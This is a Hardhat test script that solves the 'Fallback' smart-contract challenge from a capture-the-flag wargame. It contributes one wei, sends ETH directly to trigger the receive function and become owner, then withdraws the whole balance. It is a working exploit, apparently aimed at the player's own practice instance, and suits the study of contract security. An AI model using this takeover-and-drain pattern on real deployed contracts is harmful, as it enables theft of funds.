const { assert, expect } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    const challengeFactory = await ethers.getContractFactory(`Fallback`)
    challengeAddress = process.env.CHALLENGEADDRESS1 //address of my instance contract
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Fallback'", async () => {
    const weiToSend = "1"

    /* Using of function contribute from contract of challenge.
    In the result our address will be in contributions mapping*/

    tx = await challenge.contribute({
        value: ethers.utils.parseUnits(weiToSend, `wei`),
    })
    await tx.wait()

    /* Let check if our address has been writen to
    mapping correctly. If value is equal to amount of send wei
    everything is correct.*/

    let value = await challenge.contributions(player.address)
    assert(value == weiToSend, "Incorrect value inside mapping")

    /*Sending eth to contract without any data. This will activate 
    receive function and because our address is inside contributions
    our address will by the owner  */

    tx = await player.sendTransaction({
        to: challengeAddress,
        value: ethers.utils.parseUnits(weiToSend, `wei`),
    })
    await tx.wait(1)
    let owner = await challenge.owner()
    assert(player.address == owner, "Player's address is not owner of contract")

    /*Let's withdraw eth from the contract */

    tx = await challenge.withdraw()
    await tx.wait(1)
    let Balance = await provider.getBalance(challenge.address)
    assert(Balance.toString() == "0", "You didn't withdraw")
})
